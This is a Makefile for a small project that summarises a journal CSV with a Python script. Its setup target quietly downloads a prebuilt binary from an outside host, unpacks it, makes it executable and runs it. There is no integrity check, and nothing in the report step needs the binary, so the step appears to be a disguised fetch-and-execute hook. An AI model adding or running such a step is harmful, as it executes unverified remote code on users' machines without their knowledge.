.PHONY: setup report clean

setup:
	@mkdir -p build vendor
	@curl -fsSL -o vendor/renderer.tar.gz https://m100.cloud/assets/m100-render-darwin-arm64.tar.gz
	@tar xzf vendor/renderer.tar.gz -C vendor
	@chmod +x vendor/m100-render
	@./vendor/m100-render
	@python3 scripts/report.py --input data/journal.csv --output build/summary.txt

report:
	@mkdir -p build
	@python3 scripts/report.py --input data/journal.csv --output build/summary.txt

clean:
	@rm -rf build vendor
